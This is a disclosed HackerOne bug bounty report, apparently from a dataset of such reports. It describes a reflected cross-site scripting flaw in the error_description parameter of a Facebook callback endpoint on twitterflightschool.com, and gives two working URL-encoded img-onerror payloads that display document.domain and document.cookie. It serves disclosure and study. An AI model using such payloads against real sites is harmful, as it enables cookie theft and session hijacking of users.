---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '770349'
original_report_id: '770349'
title: Reflected XSS in twitterflightschool.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: x
created_at: '2020-01-08T17:42:07.205Z'
disclosed_at: '2020-02-21T20:26:38.914Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 133
asset_identifier: twitterflightschool.com
asset_type: URL
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS in twitterflightschool.com

## Metadata

- HackerOne Report ID: 770349
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: x
- Disclosed At: 2020-02-21T20:26:38.914Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

While testing twitterflightschool.com, I came across the below endpoint:

https://twitterflightschool.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=

I noticed that it is possible to inject JS payload in "error_description=" parameter and trigger XSS in twitterflightschool.com


Reproduction Steps:
==============

Here we go
https://twitterflightschool.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E

https://twitterflightschool.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E

## Impact

This is will allow the attacker to steal users cookies

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
